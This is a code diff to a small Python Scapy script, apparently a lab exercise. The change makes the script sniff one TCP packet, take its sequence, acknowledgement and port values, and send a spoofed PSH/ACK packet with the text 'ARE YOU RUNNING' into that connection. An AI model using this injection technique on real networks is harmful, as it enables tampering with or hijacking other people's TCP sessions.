@@ -9,12 +9,25 @@ dstPort = 12345
 seqNum = 12345
 ackNum = 12345
 
-injectionMessage = "Injected Message"
+injectionMessage = "ARE YOU RUNNING"
 
 
-ip = IP(src=srcIP, dst=dstIp)
+def extractPkt(pkt):
+    if pkt.haslayer(TCP):
+        global seqNum
+        global ackNum
+        global srcPort
+
+        seqNum = pkt.seq
+        ackNum = pkt.ack
+        srcPort = pkt.sport
+
+
+sniff(filter="tcp", prn=extractPkt, count=1)
+
+ip = IP(src=srcIP, dst=dstIP)
 tcp = TCP(sport=srcPort, dport=dstPort, seq=seqNum, ack=ackNum, flags="PA")
 data = injectionMessage
 
-packet = ip/tcp/data
-send(pkt)
+myPacket = ip / tcp / data
+send(myPacket)
